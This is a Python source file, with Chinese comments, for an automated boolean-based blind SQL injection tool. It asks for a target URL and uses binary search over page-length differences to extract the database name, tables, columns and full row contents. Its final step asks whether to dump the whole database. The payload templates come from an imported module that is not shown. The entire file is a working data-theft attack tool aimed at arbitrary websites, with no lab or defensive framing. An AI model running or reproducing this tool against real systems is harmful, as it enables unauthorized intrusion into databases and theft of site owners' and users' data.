import requests
import prettytable as pt
import PAYLOAD


# 二分
def dichotomy(low, high):
    mid = (low + high) // 2
    return mid


# 测试数据库长度
def db_length(url, true_length, payload):
    print("[-]开始测试数据库名长度.......")
    num = 1
    while True:
        db_length_payload = url + payload[0].format(NUM=num)
        r = requests.get(db_length_payload)
        if true_length == len(r.text):
            db_length = num
            print("[+]数据库长度：%d\n" % db_length)
            db = db_name(url, true_length, db_length, payload)  # 进行下一步，测试库名
            break
        else:
            num += 1
    return db


# 测试当前数据库名
def db_name(url, true_length, db_length, payload):
    print("[-]开始测试数据库名.......")
    db_name = ''
    for i in range(1, db_length + 1):
        low = 33
        high = 127
        while True:
            mid = dichotomy(low, high)
            db_check_payload = url + payload[1].format(NO_1=i, NUM=mid)
            if len((requests.get(db_check_payload)).text) == true_length:
                db_name += chr(mid)
                print("\r" + db_name, end="", flush=True)
                break
            # print(low, high)
            db_payload = url + payload[2].format(NO_1=i, NUM=mid)
            r = requests.get(db_payload)
            # print(len(r.text))
            if true_length != len(r.text):
                high = mid
            else:
                low = mid
    print("\n\033[31m[+]数据库名：%s\033[0m\n" % db_name)
    tb_piece(url, true_length, db_name, payload)  # 进行下一步，测试当前数据库有几张表
    return db_name


# 测试表总数
def tb_piece(url, true_length, db_name, payload):
    print("[-]开始测试%s数据库有几张表........" % db_name)
    low = 1
    high = 300
    while True:  # 猜解该数据库共有几张表
        mid = dichotomy(low, high)
        tb_check_payload = url + payload[3].format(NUM=mid)
        if len((requests.get(tb_check_payload)).text) == true_length:
            tb_piece = mid
            # print("%s数据库共%d张表"%(db_name,tb_piece))
            break
        tb_count_payload = url + payload[4].format(NUM=mid)
        r = requests.get(tb_count_payload)
        if true_length != len(r.text):
            high = mid
        else:
            low = mid
    print("[+]%s库一共有%d张表\n" % (db_name, tb_piece))
    tb_name(url, true_length, db_name, tb_piece, payload)  # 进行下一步，猜解表名


# 猜解表名
def tb_name(url, true_length, db_name, tb_piece, payload):
    print("[-]开始猜解表名.......")
    table_list = []
    for i in range(0, tb_piece):
        tb_length = 0
        tb_name = ''
        for j in range(1, 25):  # 表名长度，合理范围即可
            tb_payload = url + payload[5].format(NO_1=i, NUM=j)
            r = requests.get(tb_payload)
            if true_length == len(r.text):
                tb_length = j
                print("第%d张表名长度：%s" % (i + 1, tb_length))
                break

        for k in range(1, tb_length + 1):
            low = 33
            high = 127
            while True:
                mid = dichotomy(low, high)
                tb_check_payload = url + payload[6].format(NO_1=i, NO_2=k, NUM=mid)
                if len(requests.get(tb_check_payload).text) == true_length:
                    tb_name += chr(mid)
                    print("\r[+]：%s" % tb_name, end="", flush=True)
                    break
                tb_payload = url + payload[7].format(NO_1=i, NO_2=k, NUM=mid)
                r = requests.get(tb_payload)
                if true_length != len(r.text):
                    high = mid
                else:
                    low = mid
        print("")
        table_list.append(tb_name)
    print("\033[33m[+]%s库下的%s张表：%s\033[0m\n" % (db_name, tb_piece, table_list))
    # column_num(table_list, db_name)  # 进行下一步，猜解每张表的字段数


# 猜解指定表字段数
def column_num(url, true_length, db_name, tb_name, payload):
    # print("[-]开始猜解每%s表的字段数......." % tb_name)
    for j in range(30):  # 指定表字段数量，合理范围即可
        column_num_payload = url + payload[8].format(NUM=j, DB_NAME=db_name, TB_NAME=tb_name)
        r = requests.get(column_num_payload)
        if len(r.text) == true_length:
            column_nums = j
            print("[+]%s表\t%s个字段" % (tb_name, column_nums))
            break
    return column_nums


# 猜解指定表字段名
def column_name(url, true_length, db_name, tb_name, payload):
    print("[-]开始猜解%s表的字段名......." % tb_name)
    columns = column_num(url, true_length, db_name, tb_name, payload)
    column_name_list = []
    for i in range(columns):  # i表示每张表的字段数量
        column_name = ''
        for j in range(1, 21):  # j表示每个字段的长度
            column_name_length = url + payload[9].format(NO_1=i, NUM=j, DB_NAME=db_name, TB_NAME=tb_name)
            # print(column_name_length)
            r = requests.get(column_name_length)
            if true_length == len(r.text):
                column_length = j
                print("第%d个字段长度：%s" % (i + 1, column_length))
                break
        for k in range(1, column_length + 1):
            low = 33
            high = 127
            while True:
                mid = dichotomy(low, high)
                # print(mid)
                tb_check_payload = url + payload[10].format(NO_1=i, NO_2=k, NUM=mid, DB_NAME=db_name, TB_NAME=tb_name)
                # print(tb_check_payload)
                if len(requests.get(tb_check_payload).text) == true_length:
                    column_name += chr(mid)
                    print("\r[+]：%s" % column_name, end="", flush=True)
                    break
                # print(low, high)
                tb_payload = url + payload[11].format(NO_1=i, NO_2=k, NUM=mid, DB_NAME=db_name, TB_NAME=tb_name)
                r = requests.get(tb_payload)
                # print(tb_payload)
                if true_length != len(r.text):
                    high = mid
                else:
                    low = mid
        print("")
        column_name_list.append(column_name)
    print("\033[34m[+]：%s表中的%d个字段：%s\033[0m\n" % (tb_name, columns, column_name_list))
    return column_name_list, columns


def dump_data(url, true_length, db_name, tb_name, column_name_list, payload):
    print("\n[-]对%s表的%s字段进行暴破.......\n" % (tb_name, column_name_list))
    data_files = []
    for co_name in column_name_list:  # 字段
        for j in range(200):  # j表示有多少条数据，合理范围即可
            data_num_payload = url + payload[12].format(CO_NAME=co_name, DB_NAME=db_name, TB_NAME=tb_name, NUM=j)
            r = requests.get(data_num_payload)
            if true_length == len(r.text):
                data_num = j
                break
        print("\n[+]%s表中的%s字段有以下%s条数据：" % (tb_name, co_name, data_num))
        data_file = []
        for k in range(data_num):
            data_len = 0
            dump_data = ''
            for l in range(0, 100):  # l表示每条数据的长度，合理范围即可
                data_len_payload = url + payload[13].format(CO_NAME=co_name, DB_NAME=db_name, TB_NAME=tb_name, NO_1=k,
                                                            NUM=l)
                # print(data_len_payload)
                r = requests.get(data_len_payload)
                if true_length == len(r.text):
                    data_len = l
                    flag = 0
                    for x in range(1, data_len + 1):  # x表示每条数据的实际范围，作为mid截取的范围
                        low = 33
                        high = 127
                        while True:
                            mid = dichotomy(low, high)
                            data_check_payload = url + payload[14].format(CO_NAME=co_name, DB_NAME=db_name,
                                                                          TB_NAME=tb_name, NO_1=k, NO_2=x, NUM=mid)
                            if len(requests.get(data_check_payload).text) == true_length:
                                dump_data += chr(mid)
                                print("\r[+]：%s" % dump_data, end="", flush=True)
                                break
                            data_payload = url + payload[15].format(CO_NAME=co_name, DB_NAME=db_name, TB_NAME=tb_name,
                                                                    NO_1=k, NO_2=x, NUM=mid)
                            r = requests.get(data_payload)
                            if true_length != len(r.text):
                                high = mid
                            else:
                                low = mid
                            if low + 1 == high:
                                flag = 1
                                break
                        if flag:
                            print(" \b(存在不可显示字符)")
                            dump_data += "..."
                            break
                    print("")
                    break
            data_file.append(dump_data)
            # print(data_file)  # 输出每条数据
        data_files.append(data_file)
    return data_files


def data_show(data_files, column_name_list, column_nums):
    tb = pt.PrettyTable()
    for i in range(column_nums):
        tb.add_column(column_name_list[i], data_files[i])
    print(tb)


def main():
    url = input("[+] 请输入url: ")  # 目标url
    true_length = len(requests.get(url).text)  # 根据页面返回长度判断布尔盲注的 true & false
    payload = PAYLOAD.payload_int
    db = db_length(url, true_length, payload)  # 程序入口
    while True:
        tb = input("选择查询的表(q退出):")
        if tb == 'q':
            break
        column_name_list, columns = column_name(url, true_length, db, tb, payload)
        flag = input("是否拖库(y or n)：")
        if flag == 'y':
            data_files = dump_data(url, true_length, db, tb, column_name_list, payload)
            data_show(data_files, column_name_list, columns)


if __name__ == '__main__':
    main()

